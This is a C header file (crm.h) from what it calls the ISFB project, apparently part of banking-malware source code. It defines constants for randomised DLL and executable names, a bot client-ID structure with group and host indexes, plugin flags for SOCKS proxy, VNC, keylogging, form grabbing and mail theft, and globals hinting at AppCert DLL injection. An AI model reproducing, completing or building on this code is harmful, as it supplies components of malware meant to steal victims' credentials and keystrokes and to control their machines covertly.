//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: crm.h
// $Revision: 385 $
// $Date: 2014-10-24 13:44:04 +0400 (Пт, 24 окт 2014) $
// description:
//	ISFB main constants and definations.

#pragma once 

#include "config.h"

// Process-specific randomization seeds
#define		uDllSeed			0xEDB88320
#define		uInstallerSeed		0xCF8558FC

// Number of milliseconds to wait for all previously installed DLL to unload
#define	WAIT_TO_UNLOAD_TIMEOUT		3000

// Parser-specific constants
#define	MAX_URL_LEN					2048	// chars
#define	MAX_USER_LEN				128		// chars
#define	MAX_FORM_SIZE				0x4000	// bytes
#define	MAX_CONTENT_BUFFER_SIZE		8192	// bytes

#define	MAX_CONNECTIONS_PER_SERVER	127		// maximum number of connection to a single server avaliable for WININET
											//  see http://support.microsoft.com/kb/183110

#ifndef _DEBUG
 #define _RANDOM_DLL_NAME	TRUE
#endif
#define _RANDOM_EXE_NAME	TRUE
#define _MACHINE_LEVEL_RAND	TRUE

//#define _DISPLAY_NAMES	TRUE
#define _TRACE_CLEANUP	TRUE

#define	MAX_CLIENT_ID_LEN	32				// bytes

typedef struct _CRM_CLIENT_ID
{	
	ULONG	GroupId;	// current group ID
	USHORT	Plugins;	// active plugins mask
	UCHAR	HostIndex;	// active host index
	UCHAR	Reserved;	// reserved
	union 
	{
		GUID_EX	UserId;							// current user ID (GUID)
		CHAR	UserIdStr[MAX_CLIENT_ID_LEN];	// current user ID (string)		
	};
} CRM_CLIENT_ID, *PCRM_CLIENT_ID;

// Active plugins mask bits
#define	PG_BIT_SOCKS			1
#define	PG_BIT_VNC				2
#define	PG_BIT_KEYLOG			4
#define	PG_BIT_KNOCKER			8
#define	PG_BIT_FORMS			0x10
#define	PG_BIT_MAIL				0x20


extern	LPTSTR			g_MainRegistryKey;
extern	CRM_CLIENT_ID	g_ClientId;
extern	ULONG			g_ServerId;
extern	LPTSTR			g_ClientIdString;
extern	LPTSTR			g_UserNameString;
extern	BOOL			g_IsAppCertDll;
extern	LONG volatile	g_AttachCount;
extern	PVOID			g_KadHandle;

